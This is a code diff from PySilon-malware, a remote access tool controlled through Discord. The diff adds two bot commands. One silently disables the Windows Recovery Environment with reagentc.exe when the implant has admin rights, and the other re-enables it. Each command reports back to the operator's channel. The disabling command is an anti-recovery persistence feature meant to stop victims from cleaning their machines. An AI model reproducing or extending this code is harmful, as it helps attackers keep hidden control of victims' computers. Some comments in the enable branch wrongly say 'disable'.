@@ -500,6 +500,40 @@ async def on_message(message):
                     await message.channel.send('`Something went wrong while removing critical status`')
                     #.log Something went wrong when unsetting critical process
 
+            elif message.content == '.disable-reset':
+                #.log Message is disable-reset
+                await message.delete()
+                #.log Removed the message
+                if IsAdmin():
+                    subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
+                    #.log Disabled ReAgentC
+                    embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent success message
+                else:
+                    embed = discord.Embed(title="📛 Error",description=f'```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent error message for missing permissions
+
+            elif message.content == '.enable-reset':
+                #.log Message is disable-reset
+                await message.delete()
+                #.log Removed the message
+                if IsAdmin():
+                    subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
+                    #.log Disabled ReAgentC
+                    embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent success message
+                else:
+                    embed = discord.Embed(title="📛 Error",description=f'```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent error message for missing permissions
+
             elif expectation == 'key':
                 #.log Message is PySilon.key candidate
                 try:
